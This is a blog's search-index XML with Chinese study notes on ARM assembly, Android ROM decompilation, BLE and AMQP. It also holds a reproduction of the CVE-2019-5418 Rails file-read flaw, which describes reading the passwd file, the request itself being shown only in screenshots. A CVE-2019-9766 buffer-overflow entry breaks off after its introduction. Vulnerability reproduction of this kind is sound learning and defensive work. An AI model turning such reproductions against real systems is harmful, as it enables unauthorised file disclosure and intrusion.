<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AMQP协议笔记(暂空)</title>
    <url>/AMQP%E5%8D%8F%E8%AE%AE0_1/</url>
    <content><![CDATA[<p>*<u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>AMQP协议(暂无)</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM汇编学习笔记(0X01)</title>
    <url>/ARM%E6%B1%87%E7%BC%9601/</url>
    <content><![CDATA[<h1 id="编写ARM汇编语言"><a href="#编写ARM汇编语言" class="headerlink" title="编写ARM汇编语言"></a>编写ARM汇编语言</h1><h2 id="ARM体系结构概述"><a href="#ARM体系结构概述" class="headerlink" title="ARM体系结构概述"></a>ARM体系结构概述</h2><h3 id="ARM、Thumb、Thumb-2-和-Thumb-2EE-指令集"><a href="#ARM、Thumb、Thumb-2-和-Thumb-2EE-指令集" class="headerlink" title="ARM、Thumb、Thumb-2 和 Thumb-2EE 指令集"></a><code>ARM</code>、<code>Thumb</code>、<code>Thumb-2</code> 和 <code>Thumb-2EE</code> 指令集</h3><blockquote>
<p>ARMv4T 及更高版本定义了一个名为 <code>Thumb</code> 指令集的 16 位指令集。</p>
<p>ARMv6T2 定义了 <code>Thumb</code>-2，它与 <code>Thumb</code> 指令集相比有了重大改进。</p>
<p>在 ARMv6 及更高版本中，所有 ARM 和 <code>Thumb</code> 指令都是小端的。 在 ARMv6T2 及更高版本中，所有 <code>Thumb</code>-2 指令获取也都是小端的。</p>
<p>ARMv7 定义了 <code>Thumb</code>-2 执行环境 (<code>Thumb</code>-2EE)。</p>
</blockquote>
<h3 id="ARM、Thumb-和-ThumbEE-状态"><a href="#ARM、Thumb-和-ThumbEE-状态" class="headerlink" title="ARM、Thumb 和 ThumbEE 状态"></a>ARM、<code>Thumb</code> 和 <code>Thumb</code>EE 状态</h3><p>正执行 ARM 指令的处理器在 ARM 状态 下工作。 正执行 <code>Thumb</code> 指令的处理器在 <code>Thumb</code> 状态 下工作。</p>
<p>处于 ARM 状态下的处理器不能执行 <code>Thumb</code> 指令，而处于 <code>Thumb</code> 状态下的处理器不能执行 ARM 指令</p>
<p><code>Thumb</code>EE 引入了一种新的指令集状态：<code>Thumb</code>EE 状态。 在这种状态下，根据 <code>Thumb</code>EE 指令集内的定义执行指令。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>ARM处理器有37个寄存器。</p>
<ol>
<li><p>三十个32位通用寄存器</p>
<blockquote>
<p>在任一时刻都存在十五个通用寄存器，即 r0、r1… r13、r14，具体取决于当前的处 理器模式。<br>r13 是堆栈指针 (sp)。</p>
<p>在用户模式下，r14 被用作链接寄存器 (lr)，用于存储调用子例程时的返回地址。</p>
</blockquote>
</li>
<li><p>程序计数器（pc）</p>
<blockquote>
<p>程序计数器被当作 r15（或 pc）来加以访问。 它在 ARM 状态下以一个字（四字 节）为增量，在 Thumb 状态下则按指令的大小执行。 </p>
</blockquote>
</li>
<li><p>应用程序状态寄存器（APSR）</p>
<blockquote>
<p>APSR 存放算术逻辑单元 (ALU) 状态标记的副本。 这些标记用于确定是否执行 条件指令。</p>
</blockquote>
</li>
<li><p>当前程序状态寄存器 (CPSR)</p>
<blockquote>
<p>CPSR 存放下列内容：</p>
<ul>
<li>APSR 标记 </li>
<li>当前处理器模式</li>
<li>中断禁用标记</li>
</ul>
</blockquote>
</li>
<li><p>保存的程序状态寄存器（SPSR）</p>
<blockquote>
<p>当发生异常时，使用 SPSR 来存储 CPSR。 在每种异常处理模式下，可访问一个 SPSR。 用户模式和系统模式没有 SPSR，因为二者不是异常处理模式。</p>
</blockquote>
</li>
</ol>
<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>所有 ARM 指令的长度都是 32 位。 这些指令是按字对齐方式存储的，因此在 ARM 状态下，指令地址的两个最低有效位始终为零。</p>
<p>ARM 和 Thumb 指令可划分为多个功能组：</p>
<ul>
<li>跳转指令</li>
<li>数据处理指令</li>
<li>寄存器加载和存储指令</li>
<li>多个寄存器加载和存储指令</li>
<li>状态寄存器访问指令</li>
<li>协处理指令</li>
</ul>
<h3 id="ARM-汇编语言模块的示例"><a href="#ARM-汇编语言模块的示例" class="headerlink" title="ARM 汇编语言模块的示例"></a>ARM 汇编语言模块的示例</h3><p>ELF 节 是独立的、已命名的、不可分割的代码或数据序列。 单个代码节是生成 应用程序的最低要求。 汇编或编译的输出内容可包括： • 一个或多个代码节。 它们通常是只读节。<br>一个或多个数据节。 它们通常是读写节。 它们可以是零初始化的 (ZI)。</p>
<h3 id="ENTRY-指令"><a href="#ENTRY-指令" class="headerlink" title="ENTRY 指令"></a>ENTRY 指令</h3><p>ENTRY 指令标记的是第一个要执行的指令。 </p>
<h3 id="END-指令"><a href="#END-指令" class="headerlink" title="END 指令"></a>END 指令</h3><p>此指令指示汇编程序停止处理此源文件。 每个汇编语言源模块必须以仅包括 END 指令的一行结束。</p>
<h3 id="ALU-状态标记"><a href="#ALU-状态标记" class="headerlink" title="ALU 状态标记"></a>ALU 状态标记</h3><p>APSR 包含下列 ALU 状态标记</p>
<blockquote>
<p>N        当运算结果为负值时设置此标记。</p>
<p>Z        当运算结果为零时设置此标记。</p>
<p>C        当运算导致进位时设置此标记。</p>
<p>V        当运算导致溢出时设置此标记。</p>
<p>“如果加法的结果大于或等于 232，减法的结果为正值，或者是移动或逻辑指令中 的内嵌滚筒式移位器运算的结果导致进位，则会产生进位。<br>如果加法、减法或比较的结果大于或等于 2^31 或小于 -2^31，则会发生溢出。”</p>
</blockquote>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习途径是《ARM汇编语言官方手册》</em></p>
]]></content>
      <categories>
        <category>ARM汇编</category>
      </categories>
      <tags>
        <tag>ARM汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM汇编学习笔记(0X02)</title>
    <url>/ARM%E6%B1%87%E7%BC%9602/</url>
    <content><![CDATA[<h1 id="编写ARM汇编语言"><a href="#编写ARM汇编语言" class="headerlink" title="编写ARM汇编语言"></a>编写ARM汇编语言</h1><h2 id="将常数加载到寄存器"><a href="#将常数加载到寄存器" class="headerlink" title="将常数加载到寄存器"></a>将常数加载到寄存器</h2><h3 id="用MOV和MVN直接加载"><a href="#用MOV和MVN直接加载" class="headerlink" title="用MOV和MVN直接加载"></a>用MOV和MVN直接加载</h3><p>在 ARM 和 Thumb-2 中，可以使用 32 位 MOV 和 MVN 指令直接将一系列常数值加载 到寄存器中。<br>16 位 Thumb MOV 指令可以加载位于范围 0 到 255 内的任何常数。 不能使用 16 位MVN 指令加载常数。    </p>
<h2 id="将地址加载到寄存器中"><a href="#将地址加载到寄存器中" class="headerlink" title="将地址加载到寄存器中"></a>将地址加载到寄存器中</h2><p>通常需要将地址加到寄存器中。 可能需要加载变量、字符串常数或跳转表的起 始位置的地址。</p>
<h3 id="用-ADR-和-ADRL-直接加载"><a href="#用-ADR-和-ADRL-直接加载" class="headerlink" title="用 ADR 和 ADRL 直接加载"></a>用 ADR 和 ADRL 直接加载</h3><p>利用 ADR 指令和 ADRL 伪指令，无需执行数据加载即可生成位于某一范围内的地址。A</p>
<p>ADR 可用范围因指令集而异： </p>
<p>ARM        ±255 到字节或半字对齐的地址。 ±1020 字节到字对齐的地址。</p>
<p>32 位 Thumb-2         ±4095 字节到字节、半字或字对齐的地址。</p>
<p>16 位 Thumb        0 到 1020 字节。label 必须为字对齐。 可以使用 ALIGN 指令确保这一点。</p>
<h3 id="加载和存储可在-ARM-和-Thumb-中使用的多个指令"><a href="#加载和存储可在-ARM-和-Thumb-中使用的多个指令" class="headerlink" title="加载和存储可在 ARM 和 Thumb 中使用的多个指令"></a>加载和存储可在 ARM 和 Thumb 中使用的多个指令</h3><h1 id="ARM-和-Thumb-指令"><a href="#ARM-和-Thumb-指令" class="headerlink" title="ARM 和 Thumb 指令"></a>ARM 和 Thumb 指令</h1><h2 id="乘法指令"><a href="#乘法指令" class="headerlink" title="乘法指令"></a>乘法指令</h2><h3 id="MUL、MLA、和MLS"><a href="#MUL、MLA、和MLS" class="headerlink" title="MUL、MLA、和MLS"></a>MUL、MLA、和MLS</h3><blockquote>
<p>乘法，乘加，乘减，有符号或无符号的32位操作数，结果取低32位。</p>
</blockquote>
<p>语法：</p>
<p>MUL Rd,Rn,Rm</p>
<blockquote>
<p>MUL指令将Rm,和Rn中的值相乘，将结果的低32位存入Rd。</p>
</blockquote>
<p>MLA Rd,Rn,Rm,Ra</p>
<blockquote>
<p>MLA 指令可将 Rn 和 Rm 中的值相乘，然后再将乘积与 Ra 中的值相加，最后将所得 和的低 32 位存入 Rd。</p>
</blockquote>
<p>MLS Rd,Rn,Rm,Ra</p>
<blockquote>
<p>MLS 指令可将 Rn 和 Rm 中的值相乘，然后再从 Ra 中的值中减去乘积，最后将所得 差的低 32 位存入 Rd。</p>
</blockquote>
<h2 id="饱和指令"><a href="#饱和指令" class="headerlink" title="饱和指令"></a>饱和指令</h2><h3 id="QADD、QSUB、QDADD-和-QDSUB"><a href="#QADD、QSUB、QDADD-和-QDSUB" class="headerlink" title="QADD、QSUB、QDADD 和 QDSUB"></a>QADD、QSUB、QDADD 和 QDSUB</h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op&#123;cond&#125; &#123;Rd&#125;, Rm, Rn</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>QADD</code> 指令可将 Rm 和 Rn 中的值相加。 </p>
<p><code>QSUB</code> 指令可从 Rm 中的值中减去 Rn 中的值。</p>
<p><code>QDADD</code> 指令可计算 SAT(Rm + SAT(Rn * 2))。 进行加倍和加法运算均有可能出现饱 和。 如果加倍运算发生饱和，而加法运算没有出现饱和，则将设置 Q 标记，但最 终结果是不饱和的。</p>
<p><code>QDSUB</code> 指令可计算 SAT(Rm - SAT(Rn * 2))。 进行加倍和加法运算均有可能出现饱 和。 如果加倍运算发生饱和，而加法运算没有出现饱和，则将设置 Q 标记，但最<br>终结果是不饱和的。</p>
</blockquote>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习途径是《ARM汇编语言官方手册》</em></p>
]]></content>
      <categories>
        <category>ARM汇编</category>
      </categories>
      <tags>
        <tag>ARM汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>Android反编译学习笔记(0X01)</title>
    <url>/Andoird%E5%8F%8D%E7%BC%96%E8%AF%9101/</url>
    <content><![CDATA[<p>网上看到有人逆向小米的note3的rom，这方面资料比较少，只看理论必不行，研究了研究后大体搞明白了，不明白的时候感觉好复杂好难，研究完感觉也不是触不可及，所以说还是要动手动手动手！但是自己整也只限于软件了，硬件…穷小子消费不起呀。进入正题！</p>
<h1 id="下载rom"><a href="#下载rom" class="headerlink" title="下载rom"></a>下载rom</h1><p>首先下载小米note3的rom，下载地址：</p>
<p><a href="https://www.miui.com/download.html">小米官网固件下载</a></p>
<p>选择好以后下载就ok</p>
<h1 id="br转换dat"><a href="#br转换dat" class="headerlink" title="br转换dat"></a>br转换dat</h1><blockquote>
<p>下载好之后解压zip包，按说解压后里边应该有system.img文件的，但是并没有，android5开始以后没有system.img文件了，而是改为system.new.dat，小米里边却是一个system.new.dat.br，于是上网继续学习br文件转换为dat文件，找到一个好用的工具，比较舒适，叫<a href="https://github.com/google/brotli/releases">brotli</a>，在brotli.exe路径下进入cmd，执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brotli.exe -d system.new.dat.br</span><br></pre></td></tr></table></figure>

<p>之后会自动生成dat文件</p>
</blockquote>
<h1 id="dat转换img"><a href="#dat转换img" class="headerlink" title="dat转换img"></a>dat转换img</h1><p>得到dat文件之后就需要system.img文件了，网上各种方法都有，最终自己总结了一下最简便的一个工具，《ROM制作工具RomMakeTool》</p>
<p>使用方法如图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/YwPxgziE3OmvHD1.png"></p>
<h1 id="img解压system目录"><a href="#img解压system目录" class="headerlink" title="img解压system目录"></a>img解压system目录</h1><p>得到system.img文件后就需要转换system文件目录了，从网上搜一个system.img转换工具，或者继续使用上边的工具</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/ZahlYAH95x7Xe6L.png"></p>
<h1 id="提取odex"><a href="#提取odex" class="headerlink" title="提取odex"></a>提取odex</h1><p>解压完后就会得到一个system目录，如果有dex文件那就直接到dex转jar步骤，没有的话就需要找odex文件了，odex文件路径参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;oat&#x2F;arm64&#x2F;Settings.odex</span><br></pre></td></tr></table></figure>
<h1 id="odex转换dex"><a href="#odex转换dex" class="headerlink" title="odex转换dex"></a>odex转换dex</h1><blockquote>
<p>这里有坑，查看apk内的文件并没有看到smali文件夹，所以需要akptool.apk反编译，在本地再生成一个Setting文件夹。</p>
</blockquote>
<p>找到odex文件后，需要现在工具来先转换成为samli文件，然后再将samli文件转换为dex格式。</p>
<ol>
<li><p>baksmali.jar 用于将odex解析成smali的工具。成功后会生成一个out目录。<br> 下载地址<a href="https://bitbucket.org/JesusFreke/smali/downloads/">baksmali.jar</a></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar baksmali.jar de Settings.odex</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里还看到了另一种方法：使用ApkTool反编译Settings.apk文件得到Setting目录，目录中生成了一个smali文件夹。</p>
</blockquote>
</li>
<li><p>smali.jar 将smali文件转出成dex文件</p>
<p> 下载地址<a href="https://bitbucket.org/JesusFreke/smali/downloads/">smali.jar 下载地址</a></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar smali.jar a out -o Settings.dex</span><br></pre></td></tr></table></figure>
<blockquote>
<p>out就是新生成的目录，或者是ApkTool反编译apk文件生成的Settings文件夹中的smali目录。</p>
</blockquote>
</li>
</ol>
<h1 id="dex转换jar"><a href="#dex转换jar" class="headerlink" title="dex转换jar"></a>dex转换jar</h1><p>dex文件还不能直接打开，需要转换成jar格式，转化工具使用dex2jar。</p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java d2j-dex2jar.bat Settings.dex</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在转换的时候可能会报错，提示版本不匹配之类的。查了查资料，发现原因并不是出现在dex2jar的工具版本中，是出在dex文件中，dex2jar工具定义dex头是35或36才行，然后打开dex文件看一下dex头，果然，dex头是39。</p>
<p>然后使用工具WinHex打开dex文件，将dex头改为36，再用dex2jar，成功生成jar文件。</p>
</blockquote>
<h1 id="jd-jui分析jar包"><a href="#jd-jui分析jar包" class="headerlink" title="jd-jui分析jar包"></a>jd-jui分析jar包</h1><p>最后就是使用jd-jui分析得到的jar包了<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/IfOae5E4Y89JtHu.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/12/17/MiX8gc6aIKNomGA.png"></p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
<p>参考链接：<a href="https://blog.csdn.net/feiduclear_up/article/details/79443205%EF%BC%8Chttps://mp.weixin.qq.com/s?__biz=MzIwMzYwMTk1NA==&amp;mid=2247486906&amp;idx=1&amp;sn=d6f473abffdea7b2ece6f6bb1f72e084&amp;chksm=96cdacf7a1ba25e19569f1baf9f956139c2b03140012b96e77802a79383a15f9f2872d8a6864&amp;mpshare=1&amp;scene=23&amp;srcid=02246svlZ3hha1JuCU2R4Ppv#rd">https://blog.csdn.net/feiduclear_up/article/details/79443205，https://mp.weixin.qq.com/s?__biz=MzIwMzYwMTk1NA==&amp;mid=2247486906&amp;idx=1&amp;sn=d6f473abffdea7b2ece6f6bb1f72e084&amp;chksm=96cdacf7a1ba25e19569f1baf9f956139c2b03140012b96e77802a79383a15f9f2872d8a6864&amp;mpshare=1&amp;scene=23&amp;srcid=02246svlZ3hha1JuCU2R4Ppv#rd</a></p>
]]></content>
      <categories>
        <category>Android反编译</category>
      </categories>
      <tags>
        <tag>Android反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>BLE协议笔记(0X01)</title>
    <url>/BLE%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<h1 id="蓝牙4-0-BLE简介"><a href="#蓝牙4-0-BLE简介" class="headerlink" title="蓝牙4.0 BLE简介"></a>蓝牙4.0 BLE简介</h1><h2 id="无线网络数据传输协议对比"><a href="#无线网络数据传输协议对比" class="headerlink" title="无线网络数据传输协议对比"></a>无线网络数据传输协议对比</h2><ul>
<li>传统蓝牙数据传输速率小于3Mbps，典型数据传输距离为2~10m，典型应用是在两台蓝牙设备之间进行小量数据传输。</li>
<li>IEEE 802.11b最高数据传输速率可达11Mbps，典型数据传输距离在30~100m，IEEE 802.11b提供了一种Internet的无线接入技术。如很多笔记本电脑使用自带wifi功能上网。</li>
<li>ZigBee协议可以理解为一种短距离无线传感器网络与控制协议，传输速率低，主要传输控制信息，数据量相对于来说比较小，适用于电池的供电系统。</li>
</ul>
<h2 id="短距离无线网络分类"><a href="#短距离无线网络分类" class="headerlink" title="短距离无线网络分类"></a>短距离无线网络分类</h2><ul>
<li>无线局域网（WLANs）</li>
<li>无线个域网（WPANs）</li>
</ul>
<h3 id="蓝牙4-0-BLE"><a href="#蓝牙4-0-BLE" class="headerlink" title="蓝牙4.0 BLE"></a>蓝牙4.0 BLE</h3><p>蓝牙4.0版本涵盖了三种蓝牙技术</p>
<ul>
<li>传统蓝牙</li>
<li>高速蓝牙</li>
<li>低功耗蓝牙</li>
</ul>
<h3 id="蓝牙4-0-BLE的特点"><a href="#蓝牙4-0-BLE的特点" class="headerlink" title="蓝牙4.0 BLE的特点"></a>蓝牙4.0 BLE的特点</h3><ol>
<li><p>高可靠性</p>
<blockquote>
<p>蓝牙4.0规范在射频、基带协议、链路管理协议（LMP）中采用可靠性措施，包括：差错检测和矫正、进行数据编解码、差错控制、数据加噪等。</p>
</blockquote>
</li>
<li><p>低成本、低功耗</p>
<blockquote>
<p>低功耗蓝牙支持两种部署方式：双模式和单模式。</p>
<p>双模式中，可以集成在现有的经典蓝牙控制器中，或在经典蓝牙技术芯片上增减低功耗堆栈，整体架构基本不变，因此城北增加有限。</p>
<p>单模式面向高度集成、紧凑的设备。</p>
<p>低功耗设计：蓝牙4.0功耗较传统蓝牙降低了百分之九十。</p>
</blockquote>
</li>
<li><p>快速启动，瞬间连接</p>
<blockquote>
<p>蓝牙2.启动连接需要6s，而蓝牙4.0仅需3ms即可完成。</p>
</blockquote>
</li>
<li><p>传输距离极大提高</p>
<blockquote>
<p>传统传输距离为2~10米，而4.0可达到60 ~ 100 米。</p>
</blockquote>
</li>
<li><p>高安全性</p>
<blockquote>
<p>为保证数据传输的安全性，使用AES-128 CCM加密算法进行数据包加密和认证。</p>
</blockquote>
</li>
</ol>
<h2 id="蓝牙4-0-BLE协议简介"><a href="#蓝牙4-0-BLE协议简介" class="headerlink" title="蓝牙4.0 BLE协议简介"></a>蓝牙4.0 BLE协议简介</h2><p>蓝牙4.0 BLE规范中定义了GAP和GATT两个基本配置文件。</p>
<ul>
<li>协议栈中的GAP层负责设备访问模式和进行，包括设备发现、建立连接、终止连接、初始化安全特性和设备配置。</li>
<li>协议栈中的GATT层用于已连接的蓝牙设备之间的数据通信。</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来学习途径是《蓝牙4.0BLE物联网开发技术实战完全教程》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>BLE协议</tag>
      </tags>
  </entry>
  <entry>
    <title>BLE协议笔记(0X02)</title>
    <url>/BLE%E5%8D%8F%E8%AE%AE02/</url>
    <content><![CDATA[<h1 id="蓝牙4-0-BLE技术入门"><a href="#蓝牙4-0-BLE技术入门" class="headerlink" title="蓝牙4.0 BLE技术入门"></a>蓝牙4.0 BLE技术入门</h1><h2 id="蓝牙4-0-BLE协议栈"><a href="#蓝牙4-0-BLE协议栈" class="headerlink" title="蓝牙4.0 BLE协议栈"></a>蓝牙4.0 BLE协议栈</h2><p>协议栈是协议的具体实现形式，通俗的理解为用代码实现的函数库，便于调用。</p>
<h3 id="BLE协议栈基础"><a href="#BLE协议栈基础" class="headerlink" title="BLE协议栈基础"></a>BLE协议栈基础</h3><ul>
<li><p><strong>物理层</strong>是1Mbps自适应跳频的GFSK射频，工作与免许可证的2.4GHz ISM（工业、科学、医疗）频段。</p>
</li>
<li><p><strong>链路层</strong>用于控制设备的射频状态，设备将会处于物种状态之一：等待、广告、扫描、初始化、连接。</p>
<blockquote>
<p>广播设备：不需要建立连接就可以发送数据</p>
<p>扫描设备：收听广播设备发出的数据</p>
<p>发起连接的设备：通过发送请求来回应广播设备，如果广播设备接收请求，那么广播设备与发起连接的设备将会进入连接状态。</p>
<p>发起连接的设备成为主机，接收连接请求的设备成为从机。</p>
</blockquote>
</li>
<li><p><strong>主机控制接口层</strong>为主机和控制器之间提供标准通信接口,这一层可以使API或硬件接口，如UART、SPI、USB。</p>
</li>
<li><p><strong>逻辑链路控制及自适应协议层</strong>为上层提供数据封装服务，允许逻辑上的点对点数据通信。</p>
</li>
<li><p><strong>安全管理层</strong>定义了配对和秘钥分配方式，并为协议栈其他层与另一个设备之间的的安全连接和数据交换提供服务。</p>
</li>
<li><p><strong>属性协议层</strong>允许设备向另一个设备展示一块特定的数据，称之为属性。</p>
</li>
<li><p><strong>通用属性配置文件层</strong>定义了使用ATT的服务框架。</p>
</li>
</ul>
<h2 id="蓝牙4-0-BLE协议栈中串口应用详解"><a href="#蓝牙4-0-BLE协议栈中串口应用详解" class="headerlink" title="蓝牙4.0 BLE协议栈中串口应用详解"></a>蓝牙4.0 BLE协议栈中串口应用详解</h2><p>使用串口的基本步骤</p>
<blockquote>
<ul>
<li>初始化串口，包括设置波特率，终端等。</li>
<li>向发送缓冲区发送数据或者从接受缓冲区读取数据。</li>
</ul>
</blockquote>
<p>在蓝牙4.0 BLE协议栈中已经对串口初始化所需要的函数进行的实现，只需要传递几个参数就可以使用串口。</p>
<p>在使用串口时，只需要掌握蓝牙4.0 BLE协议栈提供的串口操作相关的三个函数即可：</p>
<ul>
<li>uint8 HalUARTOpen</li>
<li>uint16 HalUARTRead</li>
<li>uint16 HalUARTWrite</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来学习途径是《蓝牙4.0BLE物联网开发技术实战完全教程》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>BLE协议</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-5418)Ruby on Rails路径穿越与任意文件读取漏洞复现</title>
    <url>/CVE-2019-5418/</url>
    <content><![CDATA[<h2 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h2><blockquote>
<p>Ruby on Rails是一个web应用程序框架，是相对较新的web应用程序框架</p>
<p>构建在Ruby语言上</p>
</blockquote>
<h2 id="威胁类型"><a href="#威胁类型" class="headerlink" title="威胁类型"></a><strong>威胁类型</strong></h2><blockquote>
<p>远程代码执行，任意文件读取</p>
</blockquote>
<h2 id="威胁等级"><a href="#威胁等级" class="headerlink" title="威胁等级"></a><strong>威胁等级</strong></h2><blockquote>
<p>高</p>
</blockquote>
<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a><strong>漏洞编号</strong></h2><blockquote>
<p>CVE-2019-5418</p>
</blockquote>
<h2 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a><strong>受影响系统及应用版本</strong></h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rails全版本</span><br><span class="line"></span><br><span class="line">其中修复版本</span><br><span class="line">6.0.0.beta3,</span><br><span class="line">5.2.2.1</span><br><span class="line">5.1.6.2</span><br><span class="line">5.0.7.2</span><br><span class="line">4.2.11.1</span><br></pre></td></tr></table></figure>


</blockquote>
<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h2><h3 id="1、搭建环境"><a href="#1、搭建环境" class="headerlink" title="1、搭建环境"></a><strong>1</strong>、搭建环境</h3><p><strong>Ruby On Rails环境建设</strong></p>
<p><strong>1、安装git</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750537.png!small"></p>
<p><strong>2、安装rbenv到〜/ .rbenv目录</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750544.png!small"></p>
<p><strong>3、安装rbenv的插，用于编译安装ruby</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750551.png!small"></p>
<p><strong>4、用来管理 gemset, 可选, 因为有 bundler 也没什么必要</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750571.png!small"></p>
<p><strong>5、通过 gem 命令安装完 gem 后无需手动输入 rbenv rehash 命令</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750584.png!small"></p>
<p><strong>6、通过 rbenv update 命令来更新 rbenv 以及所有插件</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750598.png!small"></p>
<p><strong>7、使用 Ruby China 的镜像安装 Ruby, 国内用户推荐</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750612.png!small"></p>
<p><strong>8、然后需要将下面两句代码放在bash的配置文件中：</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750623.png!small"></p>
<p><strong>9、执行下面的命令使其生效</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p><strong>10、安装ruby</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750690.png!small"></p>
<p><strong>11、在demo路径下执行“rails s”,开启服务</strong></p>
<p><strong>指定9876端口</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750703.png!small"></p>
<p><strong>12、访问“chybeta”路径：</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750723.png!small"></p>
<p><strong>13、我们使用浏览器自带的开发者工具进行漏洞复现，按“f12”打开工具，修改这条请求，修改内容如下：</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750741.png!small"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750756.png!small"></p>
<p><strong>14、漏洞复现成功，成功读取到passwd文件的内容：</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750771.png!small"></p>
<h2 id="2、修复建议"><a href="#2、修复建议" class="headerlink" title="2、修复建议"></a><strong>2</strong>、修复建议</h2><ol>
<li><h3 id="使用已经修复该漏洞的版本"><a href="#使用已经修复该漏洞的版本" class="headerlink" title="使用已经修复该漏洞的版本"></a>使用已经修复该漏洞的版本</h3></li>
</ol>
<p>参考链接：<a href="https://www.sohu.com/a/306334931_354899">https://www.sohu.com/a/306334931_354899</a></p>
<p>ps：<a href="https://www.sohu.com/a/306334931_354899">参考链接</a>这篇文章讲解的非常细，对我在本漏洞复现过程中的理解有很大帮助，先给大佬跪了。</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现</title>
    <url>/CVE-2019-9766/</url>
    <content><![CDATA[<h1 id="CVE-2019-9766-Free-MP3-CD-Ripper缓冲区溢出远程代码执行漏洞复现"><a href="#CVE-2019-9766-Free-MP3-CD-Ripper缓冲区溢出远程代码执行漏洞复现" class="headerlink" title="(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现"></a>(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现</h1><h2 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h2><blockquote>
<p>Free MP3 CD Ripper是一款音频格式转换器。</p>
<p>Free MP3 CD Ripper 2.6版本中存在栈缓冲区溢出漏洞。远程攻击者可借助特制的.mp3文件利用该漏洞执行任意代码。</p>
</blockquote>
<h2 id="威胁类型"><a href="#威胁类型" class="headerlink" title="威胁类型"></a><strong>威胁类型</strong></h2><blockquote>
<p>远程代码执行</p>
</blockquote>
<h2 id="威胁等级"><a href="#威胁等级" class="headerlink" title="威胁等级"></a><strong>威胁等级</strong></h2><blockquote>
<p>高</p>
</blockquote>
<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><blockquote>
<p>CVE-2019-9766</p>
</blockquote>
<h2 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a>受影响系统及应用版本</h2><blockquote>
<p>Free MP3 CD Ripper 2.6</p>
</blockquote>
<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h2><blockquote>
<p><strong>攻击机：kali2020 、kali2019</strong>  </p>
